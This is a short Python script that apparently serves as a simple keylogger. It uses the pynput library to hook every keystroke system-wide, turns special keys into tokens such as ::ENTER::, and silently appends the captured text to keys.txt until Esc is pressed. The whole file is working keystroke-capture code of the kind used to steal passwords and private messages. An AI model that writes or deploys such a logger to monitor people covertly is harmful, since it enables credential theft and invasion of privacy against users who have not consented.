#IMPORT BLOCK (2022/03/25 -JW)
from pynput.keyboard import Key, Controller, Listener
import re
import time

#GLOBAL VARIABLE BLOCK (2022/03/25 -JW)
keyboard = Controller()
keys = []

#FUNCTION BLOCK (2022/03/25 -JW)
def onPress(key):
    global keys
    string = str(key).replace("'","")
    keyCheck = keyChecker(string)
    keys.append(keyCheck)
    mainString = "".join(keys)
    if len(mainString) > 15:
        with open('keys.txt','a') as file:
            file.write(mainString)
            keys = []

def onRelease(key):
    if key == Key.esc:
        return False

def keyChecker(key):
    textSearch = bool(re.search("^Key.", key))
    if(textSearch == True):
        if(key == 'Key.space'):
            returnValue = " "
        else:
            tempText = re.findall("[^.]+$", key)
            tempStr = tempText[0]
            tempStr = "::"+tempStr.upper()+"::"
            if(key == 'Key.enter'):
                tempStr = tempStr + "\n"
            returnValue = str(tempStr)
    else:
        returnValue = key
    return returnValue

def main():
    with Listener(on_press=onPress, on_release=onRelease) as listener:
        listener.join()

if __name__ == '__main__':
    main()
